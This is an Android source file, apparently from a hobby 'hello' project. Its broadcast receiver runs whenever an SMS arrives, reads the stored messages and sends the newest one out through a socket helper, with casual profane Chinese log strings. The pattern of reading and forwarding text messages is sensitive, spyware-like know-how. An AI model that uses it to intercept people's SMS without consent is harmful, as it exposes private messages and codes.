package com.example.soulomoon.hello;

/**
 * Created by soulomoon on 2016/10/19.
 */


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import android.support.annotation.RequiresApi;
import android.util.Log;
import android.view.View;

import java.util.List;

public class BroadCast extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "SMSBroadcastReceiver";

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onReceive(Context context, Intent intent) {

        SystemClock.sleep(10);

        String msg2 = "我操再发一条试一试";

        MainActivity.sendSocket(msg2);

        List<String> msgList = MainActivity.getAllSmsFromProvider(context);

        String msg = msgList.get(0);

//        for (String i : msgList)
        Log.d("内容:", msg);


        MainActivity.sendSocket(msg);



        Log.d("broadcast", "我操居然接收到广播了");
    }
}
